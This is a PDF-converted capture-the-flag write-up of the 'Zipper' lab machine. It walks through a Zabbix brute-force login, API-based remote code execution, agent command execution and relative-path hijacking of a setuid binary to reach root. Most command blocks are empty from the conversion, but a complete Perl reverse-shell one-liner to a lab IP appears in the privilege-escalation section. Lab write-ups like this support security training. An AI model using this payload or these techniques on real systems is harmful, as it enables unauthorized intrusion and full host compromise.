# Zipper

*Converted from: Zipper.pdf*

---

# Zipper
## **18 [th] February 2019 / Document No D19.100.08**

**Prepared By: egre55**

**Machine Author: burmat**

**Difficulty: Medium**

**Classification: Official**


Page 1 / 15


## **SYNOPSIS**

Zipper is a medium difficulty machine that highlights how privileged API access can be leveraged

to gain RCE, and the risk of unauthenticated agent access. It also provides an interesting

challenge in terms of overcoming command processing timeouts, and also highlights the dangers

of not specifying absolute paths in privileged admin scripts/binaries.


## **Skills Required**


  - Basic knowledge of Linux

  - Basic knowledge of Web enumeration

tools


## **Skills Learned**


  - Zabbix API enumeration

  - Exploit modification

  - Zabbix Agent command execution

  - Overcoming reverse shell

disconnects/timeouts

  - Relative path hijacking


Page 2 / 15


## **Enumeration** **Nmap**





according to the Internet Assigned Numbers Authority (IANA), is associated with the Zabbix

Agent. Zabbix is an open-source monitoring software tool that is cable of monitoring a range of

networks, devices and services.


[https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.txt](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.txt)


Visiting http://10.10.10.108/zabbix confirms that Zabbix is installed.


Page 3 / 15


​ ​


## **Zabbix** Guest

Attempting a log in with the default credentials admin:zabbix​ is unsuccessful. After clicking ​

"sign in as guest", the Zabbix console is visible. The user "zapper" on host "zabbix" is referenced.

The version of Zabbix is 3.0.

## Admin account


Patator is used in an online brute force attack, in an attempt to reveal the password for "zapper".

Unsuccessful logins result in the error: "Login name or password is incorrect.", and patator is

configured to ignore responses with this text. The SecLists "darkweb2017-top1000.txt" wordlist is

used. It is quite common for accounts (web, service accounts etc.) to have the password set as

the username, and so "zapper" is added to the top of the wordlist.



​ ​



​ ​



​ ​



​ ​


The password "zapper" has been found.



​ ​



​ ​


Page 4 / 15


However, this account doesn’t have access to the GUI.



Page 5 / 15


## API

It seems that Zabbix has an API, and the documentation provides example JSON for interacting

with it.


[https://www.zabbix.com/documentation/3.0/manual/api](https://www.zabbix.com/documentation/3.0/manual/api)


The user authentication token is requested:





{"jsonrpc":"2.0","result":"12eb58fd8324c625dd914ea29cc4c515","id":0}


The host names and interfaces are then requested.





{"jsonrpc":"2.0","result":[{"hostid":"10105","host":"Zabbix","interfaces":[{"interfac


eid":"1","ip":"127.0.0.1"}]},{"hostid":"10106","host":"Zipper","interfaces":[{"interf


aceid":"2","ip":"172.17.0.1"}]}],"id":0}


SearchSploit contains an exploit created by Alexander Gurin, which leverages the Zabbix API to

achieve RCE.


Page 6 / 15


​


## **Foothold**

The exploit is copied/downloaded, and the Zabbix root, hostid, login and password are entered

(see **Appendix A** ​ ).


[https://www.exploit-db.com/exploits/39937](https://www.exploit-db.com/exploits/39937)


The exploit works very well, and the presence of ".dockerenv" reveals that the foothold is within a

Docker container.



​



​



​



​



​


Page 7 / 15


Page 8 / 15


​


## **Lateral Movement**

The Zabbix server configuration file is examined and SQLite database credentials are discovered.


​



​



​



​



The Docker IP address is 172.17.0.2 and default gateway is 172.17.0.1. The Zabbix Agent (port

10050) is accessible on 172.17.0.1.


According to the Zabbix documentation, it is possible to execute system commands on remote

agent endpoints using the Zabbix Agent "system.run" command.


[Source: https://www.zabbix.com/documentation/3.4/manual/config/items/itemtypes/zabbix_agent​](https://www.zabbix.com/documentation/3.4/manual/config/items/itemtypes/zabbix_agent)


Page 9 / 15



​



​


​ ​



The output of "ls -al" reveals that that the directory "/backups" is available on both the container

and host, which indicates that a shared folder has been configured. Indeed, files created here on

the Docker container are confirmed accessible from the host.


​ ​



​ ​



​ ​



A reverse shell would make the job of post-exploitation on 172.17.0.1 much easier. By default,

Zabbix Agent tasks will time out after 3 seconds, meaning that the shell will effectively die on

arrival. To work around this limitation, a command is piped into the waiting listener, so that the

reverse shell spawns another shell immediately upon arrival, which remains intact.


The file "/backups/shell.pl​ " is created with the following Perl reverse shell: ​



​ ​



​ ​



​ ​


The listeners are stood up:



​ ​



​ ​



​ ​


Finally, the Agent task is executed:



​ ​



​ ​



​ ​


A reverse shell is received as zabbix on zipper (10.10.10.108), which is immediately upgraded.


Page 10 / 15


## **Privilege Escalation**

The "zabbix-service" setuid binary is identified, which provides the ability to start and stop the

zabbix-agent service. The service name is discovered after examining the binary with the

"strings" utility.





The absolute path to systemctl has not been used. By creating a malicious "systemctl" and
making its location the first PATH entry, command execution can be hijacked.


The malicious "systemctl" is created with a Perl reverse shell as contents.


Page 11 / 15


perl -e 'use
Socket;$i="10.10.14.2";$p=8000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if
(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(
STDERR,">&S");exec("/bin/sh -i");};'

The location "/var/tmp" is made the first PATH entry, the zabbix-service binary is run and service
"started".





A reverse shell running as root is received and the user and root flags can be captured.


Page 12 / 15


## **Appendix A**





Page 13 / 15


Page 14 / 15


Page 15 / 15


